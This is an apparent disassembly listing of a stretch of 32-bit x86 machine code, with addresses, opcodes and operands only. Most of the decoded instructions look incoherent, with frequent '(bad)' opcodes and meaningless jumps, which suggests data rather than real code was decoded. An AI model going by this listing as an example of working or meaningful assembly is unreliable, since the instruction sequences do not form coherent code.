  427c98:	xor    dh,cl
  427c9a:	inc    ebp
  427c9b:	scas   eax,DWORD PTR es:[edi]
  427c9c:	mov    eax,DWORD PTR [ebx]
  427c9e:	shl    al,0x0
  427ca1:	inc    ebp
  427ca2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427ca8:	call   0x458ee0
  427cad:	ud0    eax,ecx
  427cb0:	adc    al,0x4d
  427cb2:	inc    ebp
  427cb3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cb9:	lock push 0x338055
  427cbf:	add    eax,DWORD PTR [eax]
  427cc1:	ud0    ecx,edx
  427cc4:	sbb    BYTE PTR [ebp+0x5e],dl
  427cc7:	xor    ecx,ecx
  427cc9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cd0:	push   ecx
  427cd1:	add    BYTE PTR [ebp-0x38],cl
  427cd4:	mov    DWORD PTR [esi-0x740004],eax
  427cda:	cld    
  427cdb:	inc    ebp
  427cdc:	xchg   edx,eax
  427cdd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427ce3:	xabort 0xaf
  427ce6:	icebp  
  427ce7:	mov    esi,DWORD PTR [ebp-0x28]
  427cea:	(bad)  
  427ceb:	retf   
  427cec:	or     ecx,eax
  427cee:	(bad)  
  427cef:	dec    ebp
  427cf0:	pop    es
  427cf1:	(bad)  
  427cf2:	(bad)  
  427cf3:	or     BYTE PTR [esi],al
  427cf5:	jb     0x427cbd
  427cf7:	add    BYTE PTR [ebx],al
  427cf9:	inc    ebp
  427cfa:	(bad)  
  427cfb:	mov    ecx,DWORD PTR [edx]
  427cfd:	fadd   st(6),st
  427cff:	ret    
  427d00:	add    ch,BYTE PTR [eax-0x37]
  427d03:	int    0x55
  427d05:	sub    ebp,esp
  427d07:	add    edx,DWORD PTR [ecx-0x14]
  427d0a:	inc    ebp
  427d0b:	inc    ebp
  427d0c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d12:	cld    
  427d13:	(bad)  
  427d14:	mov    gs,WORD PTR [edi+0xf893be0]
  427d1a:	mov    ebp,ebp
  427d1c:	clc    
  427d1d:	push   eax
  427d1f:	push   DWORD PTR [ebp-0x4]
  427d22:	mov    BYTE PTR [ebp+0xa],0xff
  427d26:	(bad)  
  427d27:	int3   
  427d28:	or     BYTE PTR [eax],al
  427d2a:	(bad)  
  427d2b:	lea    eax,[edi]
  427d2d:	ins    BYTE PTR es:[edi],dx
  427d2e:	(bad)  
  427d2f:	inc    DWORD PTR [ecx]
  427d31:	push   eax
  427d32:	mov    BYTE PTR [ebp+0x9],0x8b
  427d36:	leave  
  427d37:	les    edx,FWORD PTR [ebp+0x0]
  427d3a:	in     al,dx
  427d3b:	call   DWORD PTR [ecx-0x75]
  427d3e:	inc    ebp
  427d3f:	cld    
  427d40:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d46:	cld    
  427d47:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d4d:	std    
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	clc    
  427d51:	test   eax,esi
  427d53:	je     0x427dca
  427d55:	mov    eax,esi
  427d57:	cld    
  427d58:	add    al,0x80
  427d5a:	add    WORD PTR [ecx+0x0],ax
  427d5e:	fadd   QWORD PTR [eax]
  427d60:	mov    BYTE PTR [eax],0xd0
  427d63:	push   0xffffffc3
  427d65:	push   edi
  427d66:	mov    edx,DWORD PTR [eax+0x51]
  427d69:	pop    edi
  427d6a:	lea    ebx,[ebx-0x8]
  427d6d:	ret    0x45
  427d70:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d76:	xchg   eax,edi
  427d78:	mov    DWORD PTR [ebp-0x75],ecx
  427d7b:	push   esi
  427d7c:	clc    
  427d7d:	jne    0x427d4f
  427d7f:	mov    ecx,0xf8450b0b
  427d84:	(bad)  
  427d85:	push   cs
  427d86:	or     BYTE PTR [ebp-0x3a],dh
  427d89:	cmp    eax,DWORD PTR [ecx]
  427d8b:	pop    esi
  427d8c:	(bad)  
  427d8d:	or     al,0x5
  427d8f:	inc    eax
  427d90:	leave  
  427d91:	in     al,dx
  427d92:	add    al,0x42
  427d94:	push   esi
  427d95:	and    eax,0xedc940cf
  427d9a:	inc    DWORD PTR [eax-0x75]
  427d9d:	fmul   QWORD PTR [ebx-0xf8739be]
  427da3:	inc    eax
  427da4:	nop
  427da5:	jmp    0x518b:0x8b8bc3ff
  427dac:	(bad)  
  427dad:	lea    eax,ds:0xff45e8f8
  427db3:	push   esi
  427db4:	push   DWORD PTR [ebp-0x39]
  427db7:	mov    eax,0x7edda46
  427dbc:	or     al,0x6
  427dbe:	push   DWORD PTR [ebp-0x3a]
  427dc1:	cmp    eax,DWORD PTR [edx]
  427dc3:	pop    esi
  427dc4:	ret    
  427dc5:	or     al,0x56
  427dc7:	inc    ecx
  427dc8:	push   ebp
  427dc9:	js     0x427db7
  427dcb:	inc    edx
  427dcc:	inc    ebp
  427dcd:	int    0x1
  427dcf:	inc    ecx
  427dd0:	sub    BYTE PTR ds:0xe77541fc,ah
  427dd6:	add    DWORD PTR [edx+0x1c],eax
  427dd9:	int3   
  427dda:	mov    eax,ebx
  427ddc:	adc    al,0x8b
  427dde:	xchg   edx,eax
  427ddf:	push   ecx
  427de0:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427de6:	rcl    DWORD PTR [esi-0x9],cl
  427de9:	jne    0x427e3b
  427deb:	mov    eax,0x7c80ece
  427df0:	rol    DWORD PTR [esi],cl
  427df2:	div    DWORD PTR [ebp+0x50]
  427df5:	cmp    ecx,edx
  427df7:	pop    esi
  427df8:	dec    BYTE PTR [edx]
  427dfa:	in     al,dx
  427dfb:	inc    edx
  427dfc:	sub    ebp,ecx
  427dfe:	inc    eax
  427dff:	(bad)  
  427e00:	push   eax
  427e01:	add    edx,DWORD PTR [eax-0x17]
  427e04:	push   edi
  427e05:	add    dh,dh
  427e07:	leave  
  427e08:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e0c:	add    BYTE PTR [ecx+0x0],dl
  427e0f:	inc    ebp
  427e10:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e16:	add    BYTE PTR [eax-0x7fbf448],bh
  427e1c:	add    al,0x2
  427e1e:	jmp    0x57e2978
  427e23:	jne    0x427e0d
  427e25:	mov    eax,DWORD PTR [edx]
  427e27:	or     BYTE PTR [eax],al
  427e29:	inc    ecx
  427e2a:	stc    
  427e2b:	in     eax,dx
  427e2c:	ss inc eax
  427e2e:	aas    
  427e2f:	out    0x7d,eax
  427e31:	inc    ecx
  427e32:	mov    esi,ecx
  427e34:	lock ret 0x7d
  427e38:	and    ecx,DWORD PTR [ebx-0x171777]
  427e3e:	add    bh,bh
  427e40:	aad    0xd7
  427e42:	add    dh,cl
  427e44:	clts   
  427e46:	(bad)  
  427e47:	call   0xffcd7d4c
  427e4c:	hlt    
  427e4d:	iret   
  427e4e:	jge    0x427e26
  427e50:	rol    DWORD PTR [esi-0x80],cl
  427e53:	icebp  
  427e54:	or     BYTE PTR [edi-0x27],cl
  427e57:	(bad)  
  427e58:	out    dx,al
  427e59:	mov    eax,DWORD PTR [ebx]
  427e5b:	(bad)  
  427e5c:	pop    esi
  427e5d:	push   es
  427e5e:	cmp    al,0xe8
  427e60:	sar    edi,0x8
  427e63:	inc    DWORD PTR [edi]
  427e65:	inc    esi
  427e66:	(bad)  
  427e67:	jmp    0x8b00:0x530e577e
  427e6e:	push   esi
  427e6f:	mov    eax,DWORD PTR [eax]
  427e71:	and    al,0x0
  427e73:	inc    ebp
  427e74:	push   eax
  427e75:	push   eax
  427e76:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e7c:	sub    edx,DWORD PTR [esi-0x24]
  427e7f:	jne    0x427e37
  427e81:	lods   eax,DWORD PTR ds:[esi]
  427e82:	mov    edx,DWORD PTR [edx-0x34]
  427e85:	dec    esi
  427e86:	out    0x83,eax
  427e88:	into   
  427e89:	push   edi
  427e8b:	loopne 0x427e5b
  427e8d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427e91:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427e98:	rol    DWORD PTR [edx],0x8
  427e9b:	mov    esp,ecx
  427e9d:	cmp    DWORD PTR [ebx],0xc
  427ea0:	mov    esi,0x5001c0
  427ea5:	push   eax
  427ea6:	push   cs
  427ea7:	push   eax
  427ea8:	(bad)  
  427ea9:	sub    edx,edi
  427eab:	push   esi
  427eac:	adc    al,0xcb
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    eax,0x203e8
  427eb4:	add    al,ah
  427eb6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427ebd:	add    dh,al
  427ebf:	add    ah,ch
  427ec1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ec7:	pop    ecx
  427ec8:	or     eax,ebx
  427eca:	cli    
  427ecb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ed1:	lea    ebp,[ebx]
  427ed3:	mov    edx,DWORD PTR [edx-0x4]
  427ed6:	dec    ecx
  427ed7:	inc    ebp
  427ed8:	shr    BYTE PTR [ebx],0x4b
  427edb:	and    al,0x0
  427edd:	(bad)  
  427ede:	jne    0x427f25
  427ee0:	pop    eax
  427ee1:	mov    al,0x5a
  427ee3:	call   0x1418142
  427ee8:	and    al,0x85
  427eea:	push   edx
  427eeb:	add    BYTE PTR [eax+eax*1+0x0],ah
  427eef:	dec    ebp
  427ef0:	mov    cl,0x23
  427ef2:	jmp    0x427ee0
  427ef4:	mov    al,0xe7
  427ef6:	call   0x13881e4
  427efb:	shr    DWORD PTR [eax+ebx*2],cl
  427efe:	lock (bad) 
  427f00:	adc    eax,0x757f008d
  427f05:	out    0x58,eax
  427f07:	cmp    al,0x7
  427f09:	pop    edx
  427f0a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f11:	push   ecx
  427f12:	cld    
  427f13:	mov    esi,0x3b0175
  427f18:	and    al,0xb0
  427f1a:	xor    BYTE PTR [edx+0x1],0x8b
  427f1e:	add    ah,bh
  427f20:	mov    edi,DWORD PTR [ebp-0x4]
  427f23:	psubsw mm7,QWORD PTR [edi]
  427f26:	add    DWORD PTR [ebp+0x0],ebp
  427f29:	rcr    eax,1
  427f2b:	mov    edi,ecx
  427f2d:	and    eax,DWORD PTR [eax]
  427f2f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f35:	call   0x12f821e
  427f3a:	add    al,cl
  427f3c:	mov    ebp,esi
  427f3e:	aam    0x83
  427f40:	or     DWORD PTR [ecx],eax
  427f42:	jne    0x427f35
  427f44:	mov    eax,DWORD PTR [eax]
  427f46:	aam    0x0
  427f48:	dec    ebp
  427f49:	jne    0x427ed6
  427f4b:	cmp    ebx,eax
  427f4d:	jb     0x427f9c
  427f4f:	jmp    0x427edc
  427f51:	mov    ebx,esp
  427f53:	int3   
  427f54:	dec    ebp
  427f55:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f5c:	mov    edx,0x8b0a8b
  427f61:	cmp    ecx,DWORD PTR [eax]
  427f63:	jb     0x427f3c
  427f65:	pop    edx
  427f66:	push   edi
  427f67:	cli    
  427f68:	pop    es
  427f69:	mov    eax,ecx
  427f6b:	jb     0x427f6f
  427f6d:	add    DWORD PTR [ebx],0xa
  427f70:	mov    eax,DWORD PTR [ebx]
  427f72:	int3   
  427f73:	add    bh,BYTE PTR [esi+0x75d10006]
  427f79:	jmp    0x427f06
  427f7b:	mov    al,0xe8
  427f7d:	call   0x10381ff
  427f82:	add    edx,DWORD PTR [ecx+ecx*8]
  427f85:	pop    edi
  427f86:	or     BYTE PTR [ecx-0x73],bl
  427f89:	pop    ecx
  427f8a:	inc    edi
  427f8b:	xor    al,0xeb
  427f8d:	push   ecx
  427f8e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427f94:	call   0xb18099
  427f99:	int3   
  427f9a:	sbb    BYTE PTR [esi],ch
  427f9c:	inc    ebp
  427f9d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fa3:	call   0x9b8212
  427fa8:	or     BYTE PTR [ebx-0x73],dl
  427fab:	cmp    al,0x47
  427fad:	mov    al,0x1
  427faf:	jb     0x427fb1
  427fb1:	mov    al,0x10
  427fb3:	push   eax
  427fb4:	add    al,0x75
  427fb6:	add    BYTE PTR [ebx],ch
  427fb8:	add    ebx,esp
  427fba:	int3   
  427fbb:	jne    0x427fcd
  427fbd:	movsx  edx,cl
  427fc0:	add    DWORD PTR [eax],eax
  427fc2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fc9:	mov    gs,edi
  427fcb:	add    BYTE PTR [eax-0x50],ch
  427fce:	add    al,ch
  427fd0:	mov    eax,DWORD PTR [ecx]
  427fd2:	sub    eax,DWORD PTR [eax]
  427fd4:	jb     0x42804b
  427fd6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427fda:	jge    0x427fc4
  427fdc:	add    al,0x1
  427fde:	add    DWORD PTR [eax],0x0
  427fe1:	jne    0x427fe3
  427fe3:	je     0x42802a
  427fe5:	mov    eax,DWORD PTR [edi]
  427fe7:	ror    BYTE PTR [ebp+0x4d],1
  427fea:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427ff1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427ff7:	mov    DWORD PTR [ebx],ebp
  427ff9:	fadd   DWORD PTR [eax+0x75]
  427ffc:	inc    eax
  427ffd:	pop    eax
  427ffe:	lea    ebx,[ecx+0x4f]
  428001:	push   0xb1000003
  428006:	out    dx,eax
  428007:	add    ebp,DWORD PTR [edx+edx*2]
  42800a:	add    BYTE PTR [ebx+ecx*4],bh
  42800d:	mov    ch,BYTE PTR [ebx]
  42800f:	jb     0x428083
  428011:	add    al,0x89
  428013:	push   eax
  428014:	call   0x842acd86
  428019:	add    DWORD PTR [eax+eax*1],eax
  42801c:	jae    0x428032
  42801e:	icebp  
  42801f:	inc    ebp
  428020:	mov    eax,DWORD PTR gs:[ecx]
  428023:	int3   
  428024:	out    dx,al
  428025:	loopne 0x428074
  428027:	sub    eax,DWORD PTR [edx]
  428029:	push   0xffffff83
  42802b:	pop    esi
  42802c:	push   cs
  42802d:	jl     0x428048
  42802f:	add    al,0xaf
  428031:	xor    eax,0x832b6d00
  428036:	mov    eax,DWORD PTR [edx]
  428038:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42803e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428044:	inc    ebp
  428045:	shr    ebx,0x3
  428048:	or     DWORD PTR [eax],0x4
  42804b:	push   0xffffffa5
  42804d:	pop    esi
  42804e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428055:	jmp    0x4280b4
  428057:	mov    edi,0xff0272
  42805c:	fdivr  QWORD PTR [ebp+0x5d]
  42805f:	push   0x4e
  428061:	pop    ecx
  428062:	call   0x42c467
  428067:	mov    DWORD PTR [ebx],eax
  428069:	in     al,0xc8
  42806b:	rol    BYTE PTR [ebp-0x75],0xc1
  42806f:	call   0xac8250
  428074:	pop    esi
  428075:	enter  0xceff,0x8b
  428079:	repz mov ecx,DWORD PTR [ebp-0x34]
  42807d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428084:	je     0x428086
  428086:	or     DWORD PTR [ebx-0x74183b24],eax
  42808c:	jne    0x428072
  42808e:	jmp    0x428089
  428090:	push   DWORD PTR [edx-0x24]
  428093:	push   0x4d
  428095:	pop    ecx
  428096:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42809a:	jge    0x4280a2
  42809c:	mov    eax,eax
  42809e:	sub    ebp,DWORD PTR [edx+0x24]
  4280a1:	pop    esi
  4280a2:	inc    ebp
  4280a3:	mov    esp,0x8b6077
  4280a8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ae:	lods   al,BYTE PTR ds:[esi]
  4280af:	add    BYTE PTR [ebx],bh
  4280b1:	enter  0xce73,0x49
  4280b5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280bd:	stc    
  4280be:	jge    0x428132
  4280c0:	jnp    0xdd42042f
  4280c6:	call   0xc5819c
  4280cb:	fadd   st(0),st
  4280cd:	dec    esi
  4280ce:	ins    BYTE PTR es:[edi],dx
  4280cf:	stc    
  4280d0:	cmp    al,0x73
  4280d2:	push   ebp
  4280d3:	mov    eax,0xf8028b
  4280d8:	jne    0x42809b
  4280da:	mov    esi,ecx
  4280dc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280df:	add    edi,DWORD PTR [ebp-0x24]
  4280e2:	sub    esp,eax
  4280e4:	and    al,0x45
  4280e6:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4280ec:	sbb    al,0xee
  4280ee:	pop    esi
  4280ef:	call   0x82811f
  4280f4:	fsubr  st,st(3)
  4280f6:	sti    
  4280f7:	add    BYTE PTR gs:[ecx],bh
  4280fa:	add    eax,esp
  4280fc:	add    DWORD PTR [esi],eax
  4280fe:	rol    DWORD PTR [ebp+0x8],0x29
  428102:	mov    esp,eax
  428104:	clc    
  428105:	jne    0x42817c
  428107:	mov    eax,0x8b0673
  42810c:	loopne 0x428153
  42810e:	loopne 0x428099
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	int3   
  428112:	inc    ebp
  428113:	mov    DWORD PTR gs:[eax+edi*8],eax
  428117:	add    al,0xc3
  428119:	sub    ecx,DWORD PTR [ebp+0x47]
  42811c:	(bad)  
  42811e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428122:	add    eax,DWORD PTR [eax]
  428124:	call   0x6444229
  428129:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42812f:	dec    esi
  428130:	ins    DWORD PTR es:[edi],dx
  428131:	in     al,dx
  428132:	lea    eax,[eax]
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42813c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428146:	and    al,0xdc
  428148:	ror    DWORD PTR [edx+0x24],0xf7
  42814c:	or     BYTE PTR [ebp+0x4c],dh
  42814f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428153:	stos   BYTE PTR es:[edi],al
  428154:	adc    edx,edi
  428156:	inc    esp
  428157:	add    edi,DWORD PTR [eax]
  428159:	jne    0x42813e
  42815b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428161:	cmp    ecx,DWORD PTR [edi]
  428163:	sub    BYTE PTR [ebp-0x7e],dl
  428166:	sar    ebp,0xb
  428169:	jmp    FWORD PTR [edi+0x2400392a]
  42816f:	sub    esi,DWORD PTR [ebx-0x73]
  428172:	mov    esp,DWORD PTR [ecx+edi*4]
  428175:	mov    ecx,DWORD PTR [eax]
  428177:	and    BYTE PTR [eax],al
  428179:	jne    0x428145
  42817b:	sub    ebp,ecx
  42817d:	sbb    BYTE PTR [esi+0x32],ah
  428180:	dec    ebp
  428181:	push   ebp
  428182:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428188:	ret    
  428189:	mov    edx,ebp
  42818b:	leave  
  42818c:	sub    DWORD PTR [esi+0x24],ebx
  42818f:	ret    0x2b
  428192:	pop    ax
  428194:	push   ebp
  428195:	rol    BYTE PTR [ebx],0xeb
  428198:	add    DWORD PTR [ecx+0x6c0001],0x40
  42819f:	jb     0x4281f6
  4281a1:	ret    
  4281a2:	in     al,dx
  4281a3:	jecxz  0x428130
  4281a5:	push   esi
  4281a6:	xchg   esp,eax
  4281a7:	jne    0x4281a9
  4281a9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281ac:	jne    0x428192
  4281ae:	mov    eax,DWORD PTR [ebp-0x77]
  4281b1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281b8:	mov    esi,DWORD PTR [ebp-0x75]
  4281bb:	pop    esi
  4281bc:	nop
  4281bd:	mov    eax,DWORD PTR [eax]
  4281bf:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281c5:	add    al,0x0
  4281c7:	inc    ebp
  4281c8:	mov    eax,DWORD PTR [ebx]
  4281ca:	mov    ebp,ebx
  4281cc:	cmp    al,0xf
  4281ce:	or     al,al
  4281d0:	inc    ebp
  4281d1:	inc    ebp
  4281d2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281d8:	cld    
  4281d9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281df:	add    BYTE PTR [ecx-0x5],dl
  4281e2:	add    eax,0x17200
  4281e7:	sbb    al,0x85
  4281e9:	dec    esp
  4281ea:	je     0x428224
  4281ec:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4281f0:	add    BYTE PTR [ebx],bh
  4281f2:	(bad)  
  4281f3:	and    al,0x39
  4281f5:	jae    0x428193
  4281f7:	mov    cl,cl
  4281f9:	inc    DWORD PTR [esp]
  4281fc:	push   ebp
  4281fd:	shr    esp,0x8
  428200:	in     al,dx
  428201:	push   esp
  428202:	add    DWORD PTR [eax],esp
  428204:	add    bl,cl
  428206:	inc    ebp
  428207:	mov    bh,0x89
  428209:	add    ah,bh
  42820b:	jmp    0xca7b9155
  428210:	pushf  
  428211:	dec    esp
  428212:	mov    edx,0xf8178520
  428217:	fst    DWORD PTR [ebp+0x0]
  42821a:	mov    BYTE PTR [eax],0xc4
  42821d:	sub    edx,DWORD PTR [ebx-0x3f]
  428220:	inc    ebp
  428221:	add    eax,0xc601dc
  428226:	mov    al,0xc6
  428229:	ins    BYTE PTR es:[edi],dx
  42822a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428231:	dec    esp
  428232:	jmp    DWORD PTR [eax]
  428234:	inc    ebp
  428235:	fnstcw WORD PTR [eax+0x29]
  428238:	test   BYTE PTR [eax],0xc5
  42823b:	rol    BYTE PTR [eax],0xc0
  42823e:	lea    ecx,[ebp-0x3cf0dbcb]
  428244:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42824a:	inc    esi
  42824b:	add    DWORD PTR [eax],ebx
  42824d:	add    dh,bh
  42824f:	mov    esi,DWORD PTR [edx+0x8]
  428252:	(bad)  
  428253:	fdiv   QWORD PTR ss:[ecx]
  428256:	(bad)  
  428257:	mov    bl,ch
  428259:	add    esi,eax
  42825b:	add    dh,bl
  42825d:	or     esi,eax
  42825f:	mov    dl,0xdf
  428261:	add    esi,eax
  428263:	add    al,ah
  428265:	push   cs
  428266:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42826d:	or     BYTE PTR [ebx],dh
  42826f:	dec    ecx
  428270:	lea    eax,[ebx]
  428272:	xor    eax,0x18fc0fc7
  428277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428278:	repz clc 
  42827a:	add    eax,DWORD PTR [ebp+0x46]
  42827d:	prefetcht0 BYTE PTR [ecx-0x2]
  428281:	xor    eax,0x7c60872
  428286:	mov    esp,0xbd32c698
  42828b:	pop    esi
  42828c:	mov    cl,0xbe
  42828f:	or     al,0xc6
  428291:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  428298:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  42829f:	add    dh,al
  4282a1:	mov    eax,ebx
  4282a3:	xor    DWORD PTR [ebx],0x35008dbc
  4282a9:	mov    ecx,DWORD PTR [edi]
  4282ab:	sbb    al,0x18
  4282ad:	inc    ebp
  4282ae:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282b5:	clc    
  4282b6:	(bad)  
  4282b7:	cmp    BYTE PTR [edx-0x64],dh
  4282ba:	lea    ecx,[ecx+0x45ffe838]
  4282c0:	mov    ecx,esp
  4282c2:	fadd   st,st(6)
  4282c4:	dec    ebp
  4282c5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282cb:	out    0x1,eax
  4282cd:	inc    ebp
  4282ce:	lea    ebp,ds:0xc8ffc6ff
  4282d4:	enter  0xa33,0xc6
  4282d8:	push   ebp
  4282d9:	leave  
  4282da:	(bad)  
  4282db:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4282e1:	add    BYTE PTR [ebp+0x44],al
  4282e4:	mov    eax,esp
  4282e6:	mov    WORD PTR [esi+0x43398300],?
  4282ec:	psubusw mm4,QWORD PTR [eax-0x78]
  4282f0:	add    BYTE PTR [ebx-0x1303f975],al
  4282f6:	add    BYTE PTR [ebp+0x1],0xf3
  4282fa:	add    BYTE PTR [ebp+0x38],al
  4282fd:	in     eax,dx
  4282fe:	inc    ebp
  4282ff:	inc    ebp
  428300:	mov    esp,ebx
  428302:	add    BYTE PTR [ebp+0x0],0xee
  428306:	mov    DWORD PTR [ebp-0x48],eax
  428309:	sub    eax,0x2e00454f
  42830e:	js     0x428355
  428310:	data16 js 0x428298
  428313:	idiv   bh
  428315:	inc    esp
  428316:	(bad)  
  428317:	fadd   st(7),st
  428319:	mov    dh,0x89
  42831b:	and    DWORD PTR [esi+0x43],0xffffffff
  42831f:	fld    DWORD PTR [ebx-0x767cc078]
  428325:	pop    es
  428326:	push   0x8d45ffec
  42832b:	in     eax,dx
  42832c:	inc    DWORD PTR [ebp-0x77]
  42832f:	loopne 0x42839b
  428331:	inc    ebp
  428332:	jmp    esp
  428334:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428338:	mov    DWORD PTR [ebp+0x6c],eax
  42833b:	(bad)  
  42833d:	inc    ebp
  42833e:	(bad)  
  42833f:	call   0xe7cbc850
  428344:	outs   dx,BYTE PTR ds:[esi]
  428345:	inc    ebp
  428346:	(bad)  
  428347:	js     0x4282cc
  428349:	div    BYTE PTR ds:0x70bc8944
  42834f:	mov    dh,0xff
  428351:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428358:	jb     0x4282dd
  42835a:	dec    DWORD PTR [eax]
  42835c:	mov    ebp,esp
  42835e:	test   WORD PTR [ebp-0x1],ax
  428365:	inc    ebp
  428366:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42836d:	adc    edi,edi
  42836f:	mov    ecx,esi
  428371:	mov    eax,DWORD PTR [eax]
  428373:	cmp    BYTE PTR [esi-0x1],ah
  428376:	test   DWORD PTR [ebx],edi
  428378:	push   DWORD PTR [ebp-0x1]
  42837b:	mov    DWORD PTR [esi-0x48],ebp
  42837e:	add    BYTE PTR [ebp+0x66],al
  428381:	jmp    0x428308
  428383:	pushf  
  428384:	dec    DWORD PTR [ebx-0x7f9c0301]
  42838a:	add    BYTE PTR [ecx],al
  42838c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428393:	add    al,al
  428395:	add    BYTE PTR [esi+0x45],ah
  428398:	test   DWORD PTR [ebx+0xff7cff],ecx
  42839e:	dec    esp
  42839f:	mov    DWORD PTR [eax],eax
  4283a1:	mov    esp,DWORD PTR [esi-0x4]
  4283a4:	inc    ebp
  4283a5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283ac:	mov    DWORD PTR [ecx-0x7e],esp
  4283af:	add    BYTE PTR [edi-0x73],al
  4283b2:	push   0xffffffd1
  4283b4:	mov    WORD PTR [ebp+0x64],ax
  4283b8:	(bad)  
  4283b9:	call   eax
  4283bb:	mov    esp,eax
  4283bd:	data16 icebp 
  4283bf:	test   DWORD PTR [ebp-0x1],eax
  4283c2:	(bad)  
  4283c4:	out    0xc0,eax
  4283c6:	lea    esp,[esi-0x30]
  4283c9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283cf:	inc    edi
  4283d0:	jmp    0x75ff:0x40858866
  4283d7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283dd:	test   esi,edi
  4283df:	(bad)  
  4283e0:	(bad)  
  4283e1:	inc    DWORD PTR [ebp-0x9901b9]
  4283e7:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  4283ed:	rcl    BYTE PTR [ecx+0x66],0x33
  4283f1:	test   DWORD PTR [ebx+0xff72ff],edi
  4283f7:	inc    edi
  4283f8:	ret    
  4283f9:	mov    ax,WORD PTR [ebp-0x3f0004]
  428400:	push   eax
  428401:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428408:	add    BYTE PTR [ebx-0x764ff439],al
  42840e:	push   DWORD PTR [esi+0x1]
  428411:	inc    DWORD PTR [eax]
  428413:	mov    eax,0xff99ff
  428418:	or     BYTE PTR [ecx-0x7a87bb],cl
  42841e:	jne    0x4283d8
  428420:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42842a:	mov    ecx,0xd74fb8
  42842f:	add    cl,al
  428431:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428437:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42843e:	(bad)  
  42843f:	push   ebp
  428441:	mov    eax,0x8c2789
  428446:	ret    0x6689
  428449:	adc    BYTE PTR [ebp+0x4c],0x8d
  42844d:	add    bl,bl
  42844f:	mov    WORD PTR [ebp-0x70],ax
  428453:	(bad)  
  428454:	ret    0x660d
  428457:	or     BYTE PTR [ebp-0x77],dl
  42845a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428461:	in     al,0x89
  428463:	(bad)  
  428464:	xchg   esi,eax
  428465:	aam    0xcf
  428467:	call   0x45dafcf5
  42846c:	dec    edx
  42846d:	pop    ecx
  42846e:	mov    edx,DWORD PTR [eax]
  428470:	repnz push bp
  428473:	or     BYTE PTR [ebx+0x5510663b],0x49
  42847a:	(bad)  
  42847b:	repnz xor eax,0xa0898945
  428481:	mov    ah,0x89
  428483:	jmp    DWORD PTR [edx+0x66b0418d]
  428489:	inc    DWORD PTR [ebp+0x50]
  42848c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428490:	mov    DWORD PTR [eax],ecx
  428492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428493:	pop    es
  428494:	inc    ecx
  428495:	(bad)  
  428496:	cbw    
